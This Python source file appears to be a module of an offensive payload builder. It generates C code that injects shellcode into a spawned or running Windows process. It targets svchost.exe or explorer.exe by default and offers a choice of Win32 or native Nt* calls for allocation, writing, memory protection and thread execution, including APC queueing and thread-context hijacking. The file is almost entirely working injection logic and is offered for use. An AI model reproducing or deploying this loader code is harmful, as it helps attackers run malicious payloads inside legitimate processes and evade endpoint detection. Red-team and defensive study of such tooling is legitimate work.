from c.utils.functions import *
from common.utils.argumentparser import ArgumentParser

class processinject:
    def __init__(self, arguments):

        parser = ArgumentParser(modulename=self.__class__.__name__)
        parser.add_argument(name='mode', default='spawn', help='Spawn a new process or inject into another one', choices={'spawn', 'inject'})
        parser.add_argument(name='spawn', default='CreateProcessA', help='Which function to use to spawn a new process', choices={'CreateProcessA', 'NtCreateUserProcess'})
        parser.add_argument(name='allocate', default='VirtualAllocEx', help='Function to use for allocating memory', choices={'VirtualAllocEx', 'NtAllocateVirtualMemory'})
        parser.add_argument(name='write', default='WriteProcessMemory', help='Function used for writing memory', choices={'WriteProcessMemory', 'NtWriteVirtualMemory'})
        parser.add_argument(name='execute', default='CreateRemoteThread', help='Function used for executing the shellcode', choices={'CreateRemoteThread', 'QueueUserAPC', 'SetThreadContext', 'NtCreateThreadEx', 'NtQueueApcThread'})
        parser.add_argument(name='protect', default='VirtualProtectEx', help='Function used for changing memory protections', choices={'VirtualProtectEx', 'NtProtectVirtualMemory'})
        parser.add_argument(name='wait', default='WaitForSingleObject', help='Function used for waiting for execution to finish. Only applicable for CreateRemoteThread and NtCreateThreadEx', choices={'WaitForSingleObject', 'NtWaitForSingleObject', 'None'})
        parser.add_argument(name='close', default='CloseHandle', help='Function used for closing handles after use', choices={'CloseHandle', 'NtClose'})
        parser.add_argument(name='target', default='', help='Target process for spawning or injecting', choices={})
        parser.add_argument(name='perm', default='rx', help='Protection of memory when shellcode executes', choices={'rx': 'PAGE_EXECUTE_READ', 'rwx':'PAGE_EXECUTE_READWRITE'})
        self.args = parser.parse_args(arguments)     

        # Target override if not specified
        if self.args['target'] == '':
            if self.args['mode'] == 'inject':
                self.args['target'] = 'explorer.exe'
            elif self.args['mode'] == 'spawn':
                self.args['target'] = 'C:\\\\windows\\\\system32\\\\svchost.exe'
        else:
            self.args['target'] = self.args['target'].replace('\\','\\\\')

        # Override wait option
        if self.args['execute'] in ['NtCreateThreadEx', 'CreateRemoteThread']:
            self.args['wait'] = 'WaitForSingleObject'
        else:
            self.args['wait'] = 'None'

    def imports(self) -> list[str]:
        return ["#include <windows.h>",
                "#include <stdio.h>", 
                "#include <stdlib.h>",
                "#include <tlhelp32.h>", 
                '#include "spawnandinject.h"']

    def compilerOptions(self) -> list[str]:
        return []
    
    def codeblocks(self) -> str:
        return ''

    def template(self) -> str:
        template = ''

        if self.args['mode'] == 'spawn':
            if self.args['spawn'] == 'CreateProcessA':
                template += CreateProcessA(self.args['target'])
            elif self.args['spawn'] == 'NtCreateUserProcess':
                template += NtCreateUserProcess(self.args['target'])
        elif self.args['mode'] == 'inject':
            template += FindProcess(self.args['target'])

        if self.args['allocate'] == 'VirtualAllocEx':
            template += VirtualAllocEx('buffer', 'hProcess', '{shellcodeSize}', 'MEM_COMMIT | MEM_RESERVE', 'PAGE_READWRITE')
        elif self.args['allocate'] == 'NtAllocateVirtualMemory':
            template += NtAllocateVirtualMemory('buffer', 'hProcess', '{shellcodeSize}', 'MEM_COMMIT | MEM_RESERVE', 'PAGE_READWRITE')

        template += '\n\t{transformers}\n\t'

        if self.args['write'] == 'WriteProcessMemory':
            template += WriteProcessMemory('hProcess', 'buffer', 'shellcode', '{shellcodeSize}')
        elif self.args['write'] == 'NtWriteVirtualMemory':
            template += NtWriteVirtualMemory('hProcess', 'buffer', 'shellcode', '{shellcodeSize}')

        if self.args['protect'] == 'VirtualProtectEx':
            template += VirtualProtectEx('hProcess', 'buffer', '{shellcodeSize}', self.args['perm'])
        elif self.args['protect'] == 'NtProtectVirtualMemory':
            template += NtProtectVirtualMemory('hProcess', 'buffer', '{shellcodeSize}', self.args['perm'])

        if self.args['execute'] == 'CreateRemoteThread':
            template += CreateRemoteThread('newThread', 'hProcess', 'buffer')
        elif self.args['execute'] == 'QueueUserAPC':
            template += QueueUserAPC('buffer', 'hThread')
        elif self.args['execute'] == 'SetThreadContext':
            if self.args['mode'] == 'inject':
                template += SuspendThread('hThread')
            template += GetThreadContext('ctx', 'hThread')
            template += '\tctx.Rip = (DWORD64)buffer;'
            template += SetThreadContext('ctx', 'hThread')
        elif self.args['execute'] == 'NtCreateThreadEx':
            template += NtCreateThreadEx('newThread', 'hProcess', 'buffer')
        elif self.args['execute'] == 'NtQueueApcThread':
            template += NtQueueApcThread('hThread', 'buffer')

        if self.args['wait'] == 'WaitForSingleObject':
            template += WaitForSingleObject('newThread', 500)
        elif self.args['wait'] == 'NtWaitForSingleObject':
            template += NtWaitForSingleObject('newThread', 0)
        elif self.args['wait'] == 'None':
            template += ResumeThread('hThread')

        if self.args['close'] == 'CloseHandle':
            template += CloseHandle('hThread')
            template += CloseHandle('hProcess')
        elif self.args['close'] == 'NtClose':
            template += NtClose('hThread')
            template += NtClose('hProcess')

        return template